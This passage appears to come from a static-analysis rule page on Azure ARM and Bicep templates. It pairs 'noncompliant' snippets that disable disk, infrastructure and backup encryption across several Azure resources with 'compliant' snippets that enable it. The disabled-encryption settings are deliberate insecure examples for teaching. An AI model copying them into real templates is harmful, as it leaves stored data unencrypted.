href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.hdinsight/clusters\">Microsoft.HDInsight/clusters</a>:</p>\n<p>Disabled encryption for data disk:</p>\n<pre data-diff-id=\"1301\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.HDInsight/clusters\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"computeProfile\": {\n          \"roles\": [\n            {\n              \"encryptDataDisks\": false\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1311\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {\n  properties: {\n    computeProfile: {\n      roles: [\n        {\n          encryptDataDisks: false\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Disabled encryption for data disk at application level:</p>\n<pre data-diff-id=\"1302\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"clusters/example\",\n      \"type\": \"Microsoft.HDInsight/clusters/applications\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"computeProfile\": {\n          \"roles\": [\n            {\n              \"encryptDataDisks\": false\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1312\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.HDInsight/clusters/applications@2021-06-01' = {\n  properties: {\n    computeProfile: {\n      roles: [\n        {\n          encryptDataDisks: false\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Disabled encryption for resource disk:</p>\n<pre data-diff-id=\"1303\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.HDInsight/clusters\",\n      \"apiVersion\": \"2021-06-01\",\n      \"properties\": {\n        \"diskEncryptionProperties\": {\n          \"encryptionAtHost\": false\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1313\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.HDInsight/clusters@2021-06-01' = {\n  properties: {\n    diskEncryptionProperties: {\n      encryptionAtHost: false\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.kusto/clusters\">Microsoft.Kusto/clusters</a>:</p>\n<p>Disabled encryption for disk:</p>\n<pre data-diff-id=\"1401\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Kusto/clusters\",\n      \"apiVersion\": \"2022-12-29\",\n      \"properties\": {\n        \"enableDiskEncryption\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1411\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Kusto/clusters@2022-12-29' = {\n  properties: {\n    enableDiskEncryption: false\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.recoveryservices/vaults\">Microsoft.RecoveryServices/vaults</a>:</p>\n<p>Disabled encryption for disk:</p>\n<pre data-diff-id=\"1501\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.RecoveryServices/vaults\",\n      \"apiVersion\": \"2023-01-01\",\n      \"properties\": {\n        \"encryption\": {\n          \"infrastructureEncryption\": \"Disabled\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1511\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.RecoveryServices/vaults@2023-01-01' = {\n  properties: {\n    encryption: {\n      infrastructureEncryption: 'Disabled'\n    }\n  }\n}\n</pre>\n<p>Disabled encryption on infastructure for backup:</p>\n<pre data-diff-id=\"1502\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"vaults/example\",\n      \"type\": \"Microsoft.RecoveryServices/vaults/backupEncryptionConfigs\",\n      \"apiVersion\": \"2023-01-01\",\n      \"properties\": {\n        \"infrastructureEncryptionState\": \"Disabled\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1512\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.RecoveryServices/vaults/backupEncryptionConfigs@2023-01-01' = {\n  properties: {\n    encryptionAtRestType: '{CustomerManaged | MicrosoftManaged}'\n    infrastructureEncryptionState: 'Disabled'\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.redhatopenshift/openshiftclusters\">Microsoft.RedHatOpenShift/openShiftClusters</a>:</p>\n<p>Disabled disk encryption for master profile and worker profiles:</p>\n<pre data-diff-id=\"1601\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.RedHatOpenShift/openShiftClusters\",\n      \"apiVersion\": \"2022-09-04\",\n      \"properties\": {\n        \"masterProfile\": {\n          \"encryptionAtHost\": \"Disabled\"\n        },\n        \"workerProfiles\": [\n          {\n            \"encryptionAtHost\": \"Disabled\"\n          }\n        ]\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1611\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.RedHatOpenShift/openShiftClusters@2022-09-04' = {\n  properties: {\n    masterProfile: {\n      encryptionAtHost: 'Disabled'\n    }\n    workerProfiles: [\n      {\n        encryptionAtHost: 'Disabled'\n      }\n    ]\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.sqlvirtualmachine/sqlvirtualmachines\">Microsoft.SqlVirtualMachine/sqlVirtualMachines</a>:</p>\n<p>Disabled encryption for SQL Virtual Machine:</p>\n<pre data-diff-id=\"801\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.SqlVirtualMachine/sqlVirtualMachines\",\n      \"apiVersion\": \"2022-08-01-preview\",\n      \"properties\": {\n        \"autoBackupSettings\": {\n          \"enableEncryption\": false\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"811\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.SqlVirtualMachine/sqlVirtualMachines@2022-08-01-preview' = {\n  properties: {\n    autoBackupSettings: {\n      enableEncryption: false\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts\">Microsoft.Storage/storageAccounts</a>:</p>\n<p>Disabled enforcing of infrastructure encryption for double encryption of data:</p>\n<pre data-diff-id=\"1001\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Storage/storageAccounts\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"encryption\": {\n          \"requireInfrastructureEncryption\": false\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1011\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {\n  properties: {\n    encryption: {\n      requireInfrastructureEncryption: false\n    }\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts/encryptionscopes?pivots=deployment-language-bicep\">Microsoft.Storage/storageAccounts/encryptionScopes</a>:</p>\n<p>Disabled enforcing of infrastructure encryption for double encryption of data at encryption scope level:</p>\n<pre data-diff-id=\"1002\" data-diff-type=\"noncompliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"storageAccounts/example\",\n      \"type\": \"Microsoft.Storage/storageAccounts/encryptionScopes\",\n      \"apiVersion\": \"2022-09-01\",\n      \"properties\": {\n        \"requireInfrastructureEncryption\": false\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1012\" data-diff-type=\"noncompliant\">\nresource symbolicname 'Microsoft.Storage/storageAccounts/encryptionScopes@2022-09-01' = {\n  properties: {\n    requireInfrastructureEncryption: false\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.azurearcdata/sqlserverinstances/databases\">Microsoft.AzureArcData/sqlServerInstances/databases</a>:</p>\n<p>Enabled encryption on SQL service instance database:</p>\n<pre data-diff-id=\"1201\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"databases/example\",\n      \"type\": \"Microsoft.AzureArcData/sqlServerInstances/databases\",\n      \"apiVersion\": \"2023-03-15-preview\",\n      \"properties\": {\n        \"databaseOptions\": {\n          \"isEncrypted\": true\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1211\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.AzureArcData/sqlServerInstances/databases@2023-03-15-preview' = {\n  properties: {\n    databaseOptions: {\n      isEncrypted: true\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks\">Microsoft.Compute/disks</a>:</p>\n<p>Enabled encryption for managed disk:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/disks\",\n      \"apiVersion\": \"2022-07-02\",\n      \"properties\": {\n        \"encryption\": {\n          \"diskEncryptionSetId\": \"string\",\n          \"type\": \"string\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource symbolicname 'Microsoft.Compute/disks@2022-07-02' = {\n  properties: {\n    encryption: {\n      diskEncryptionSetId: 'string'\n      type: 'string'\n    }\n  }\n}\n</pre>\n<p>Enabled encryption through setting <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/disks?pivots=deployment-language-arm-template#encryptionsettingscollection-1\">encryptionSettingsCollection</a>:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Compute/disks\",\n      \"apiVersion\": \"2022-07-02\",\n      \"properties\": {\n        \"encryptionSettingsCollection\": {\n          \"enabled\": true,\n          \"encryptionSettings\": [\n            {\n              \"diskEncryptionKey\": {\n                \"secretUrl\": \"string\",\n                \"sourceVault\": {\n                  \"id\": \"string\"\n                }\n              }\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource symbolicname 'Microsoft.Compute/disks@2022-07-02' = {\n  properties: {\n    encryptionSettingsCollection: {\n      enabled: true\n      encryptionSettings: [\n        {\n          diskEncryptionKey: {\n            secretUrl: 'string'\n            sourceVault: {\n              id: 'string'\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Enabled encryption through a security profile for an OS disk:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"type\": \"Microsoft.Compute/disks\",\n      \"apiVersion\": \"2022-07-02\",\n      \"properties\": {\n        \"securityProfile\": {\n          \"secureVMDiskEncryptionSetId\": \"string\",\n          \"securityType\": \"{'ConfidentialVM_DiskEncryptedWithCustomerKey' | 'ConfidentialVM_DiskEncryptedWithPlatformKey' | 'ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey' | 'TrustedLaunch'}\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource symbolicname 'Microsoft.Compute/disks@2022-07-02' = {\n  properties: {\n    securityProfile: {\n      secureVMDiskEncryptionSetId: 'string'\n      securityType: '{ConfidentialVM_DiskEncryptedWithCustomerKey | ConfidentialVM_DiskEncryptedWithPlatformKey | ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey | TrustedLaunch}'\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/snapshots\">Microsoft.Compute/snapshots</a>:</p>\n<p>Enabled disk encryption for snapshot:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/snapshots\",\n      \"apiVersion\": \"2022-07-02\",\n      \"properties\": {\n        \"encryption\": {\n          \"diskEncryptionSetId\": \"string\",\n          \"type\": \"{'EncryptionAtRestWithCustomerKey' | 'EncryptionAtRestWithPlatformAndCustomerKeys' | 'EncryptionAtRestWithPlatformKey'}\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {\n  properties: {\n    encryption: {\n      diskEncryptionSetId: 'string'\n      type: '{EncryptionAtRestWithCustomerKey | EncryptionAtRestWithPlatformAndCustomerKeys | EncryptionAtRestWithPlatformKey}'\n    }\n  }\n}\n</pre>\n<p>Enabled disk encryption with settings collection:</p>\n<pre data-diff-id=\"402\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/snapshots\",\n      \"apiVersion\": \"2022-07-02\",\n      \"properties\": {\n        \"encryptionSettingsCollection\": {\n          \"enabled\": true,\n          \"encryptionSettings\": [\n            {\n              \"diskEncryptionKey\": {\n                \"secretUrl\": \"\",\n                \"sourceVault\": {\n                  \"id\": \"string\"\n                }\n              }\n            }\n          ],\n          \"encryptionSettingsVersion\": \"{'1.0' | '1.1'}\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"412\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {\n  properties: {\n    encryptionSettingsCollection: {\n      enabled: true\n      encryptionSettings: [\n        {\n          diskEncryptionKey: {\n            secretUrl: ''\n            sourceVault: {\n              id: 'string'\n            }\n          }\n        }\n      ]\n      encryptionSettingsVersion: '{1.0 | 1.1}'\n    }\n  }\n}\n</pre>\n<p>Enabled disk encryption through security profile:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/snapshots\",\n      \"apiVersion\": \"2022-07-02\",\n      \"properties\": {\n        \"securityProfile\": {\n          \"secureVMDiskEncryptionSetId\": \"string\",\n          \"securityType\": \"{'ConfidentialVM_DiskEncryptedWithCustomerKey' | 'ConfidentialVM_DiskEncryptedWithPlatformKey' | 'ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey' |'TrustedLaunch'}\"\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource symbolicname 'Microsoft.Compute/snapshots@2022-07-02' = {\n  properties: {\n    securityProfile: {\n      secureVMDiskEncryptionSetId: 'string'\n      securityType: '{ConfidentialVM_DiskEncryptedWithCustomerKey | ConfidentialVM_DiskEncryptedWithPlatformKey | ConfidentialVM_VMGuestStateOnlyEncryptedWithPlatformKey | TrustedLaunch}'\n    }\n  }\n}\n</pre>\n<p>For <a href=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachines\">Microsoft.Compute/virtualMachines</a>:</p>\n<p>Enabled encryption at host level:</p>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"securityProfile\": {\n          \"encryptionAtHost\": true\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"111\" data-diff-type=\"compliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    securityProfile: {\n      encryptionAtHost: true\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for managed disk:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"dataDisks\": [\n            {\n              \"id\": \"myDiskId\",\n              \"managedDisk\": {\n                \"diskEncryptionSet\": {\n                  \"id\": \"string\"\n                }\n              }\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"112\" data-diff-type=\"compliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      dataDisks: [\n        {\n          name: 'myDisk'\n          managedDisk: {\n            diskEncryptionSet: {\n              id: 'string'\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for managed disk through security profile:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"dataDisks\": [\n            {\n              \"id\": \"myDiskId\",\n              \"managedDisk\": {\n                \"securityProfile\": {\n                  \"diskEncryptionSet\": {\n                    \"id\": \"string\"\n                  }\n                }\n              }\n            }\n          ]\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      dataDisks: [\n        {\n          name: 'myDisk'\n          managedDisk: {\n            securityProfile: {\n              diskEncryptionSet: {\n                id: 'string'\n              }\n            }\n          }\n        }\n      ]\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for OS disk:</p>\n<pre data-diff-id=\"104\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"osDisk\": {\n            \"encryptionSettings\": {\n              \"enabled\": true,\n              \"diskEncryptionKey\": {\n                \"secretUrl\": \"string\",\n                \"sourceVault\": {\n                  \"id\": \"string\"\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"114\" data-diff-type=\"compliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      osDisk: {\n        name: 'myDisk'\n        encryptionSettings: {\n          enabled: true\n          diskEncryptionKey: {\n            secretUrl: 'string'\n            sourceVault: {\n              id: 'string'\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for OS managed disk:</p>\n<pre data-diff-id=\"105\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"osDisk\": {\n            \"managedDisk\": {\n              \"id\": \"myDiskId\",\n              \"diskEncryptionSet\": {\n                \"id\": \"string\"\n              }\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"115\" data-diff-type=\"compliant\">\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      osDisk: {\n        name: 'myDisk'\n        managedDisk: {\n          id: 'myDiskId'\n          diskEncryptionSet: {\n            id: 'string'\n          }\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for OS managed disk through security profile:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachines\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"storageProfile\": {\n          \"osDisk\": {\n            \"managedDisk\": {\n              \"securityProfile\": {\n                \"diskEncryptionSet\": {\n                  \"id\": \"string\"\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource myName 'Microsoft.Compute/virtualMachines@2022-11-01' = {\n  properties: {\n    storageProfile: {\n      osDisk: {\n        name: 'myDisk'\n        managedDisk: {\n          id: 'myDiskId'\n          securityProfile: {\n            diskEncryptionSet: {\n              id: 'string'\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.compute/virtualmachinescalesets/virtualmachines\">Microsoft.Compute/virtualMachineScaleSets</a>:</p>\n<p>Enabled encryption at host level:</p>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"securityProfile\": {\n            \"encryptionAtHost\": true\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"211\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      securityProfile: {\n        encryptionAtHost: true\n      }\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for data disk:</p>\n<pre data-diff-id=\"202\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"storageProfile\": {\n            \"dataDisks\": [\n              {\n                \"name\": \"myDataDisk\",\n                \"managedDisk\": {\n                  \"diskEncryptionSet\": {\n                    \"id\": \"string\"\n                  }\n                }\n              }\n            ]\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"212\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      storageProfile: {\n        dataDisks: [\n          {\n            name: 'myDataDisk'\n            managedDisk: {\n              diskEncryptionSet: {\n                id: 'string'\n              }\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for data disk through security profile:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"storageProfile\": {\n            \"dataDisks\": [\n              {\n                \"name\": \"myDataDisk\",\n                \"managedDisk\": {\n                  \"securityProfile\": {\n                    \"diskEncryptionSet\": {\n                      \"id\": \"string\"\n                    }\n                  }\n                }\n              }\n            ]\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      storageProfile: {\n        dataDisks: [\n          {\n            name: 'myDataDisk'\n            managedDisk: {\n              securityProfile: {\n                diskEncryptionSet: {\n                  id: 'string'\n                }\n              }\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for OS disk:</p>\n<pre data-diff-id=\"204\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"storageProfile\": {\n            \"osDisk\": {\n              \"name\": \"myOsDisk\",\n              \"managedDisk\": {\n                \"diskEncryptionSet\": {\n                  \"id\": \"string\"\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"214\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      storageProfile: {\n        osDisk: {\n          name: 'myOsDisk'\n          managedDisk: {\n            diskEncryptionSet: {\n              id: 'string'\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>Enabled encryption for OS disk through security profile:</p>\n<pre>\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.Compute/virtualMachineScaleSets\",\n      \"apiVersion\": \"2022-11-01\",\n      \"properties\": {\n        \"virtualMachineProfile\": {\n          \"storageProfile\": {\n            \"osDisk\": {\n              \"name\": \"myOsDisk\",\n              \"managedDisk\": {\n                \"securityProfile\": {\n                  \"diskEncryptionSet\": {\n                    \"id\": \"string\"\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  ]\n}\n</pre>\n<pre>\nresource symbolicname 'Microsoft.Compute/virtualMachineScaleSets@2022-11-01' = {\n  properties: {\n    virtualMachineProfile: {\n      storageProfile: {\n        osDisk: {\n          name: 'myOsDisk'\n          managedDisk: {\n            securityProfile: {\n              diskEncryptionSet: {\n                id: 'string'\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n</pre>\n<p>For <a\nhref=\"https://learn.microsoft.com/en-us/azure/templates/microsoft.containerservice/managedclusters\">Microsoft.ContainerService/managedClusters</a>:</p>\n<p>Enabled encryption at host and set the disk encryption set ID:</p>\n<pre data-diff-id=\"1101\" data-diff-type=\"compliant\">\n{\n  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",\n  \"contentVersion\": \"1.0.0.0\",\n  \"resources\": [\n    {\n      \"name\": \"example\",\n      \"type\": \"Microsoft.ContainerService/managedClusters\",\n      \"apiVersion\": \"2023-03-02-preview\",\n      \"properties\": {\n        \"agentPoolProfiles\": [\n          {\n            \"enableEncryptionAtHost\": true\n          }\n        ],\n        \"diskEncryptionSetID\": \"string\"\n      }\n    }\n  ]\n}\n</pre>\n<pre data-diff-id=\"1111\" data-diff-type=\"compliant\">\nresource symbolicname 'Microsoft.ContainerService/managedClusters@2023-03-02-preview' = {\n  properties: {\n    agentPoolProfiles: [\n      {\n        enableEncryptionAtHost: true\n      }\n    ]\n    diskEncryptionSetID: 'string'\n  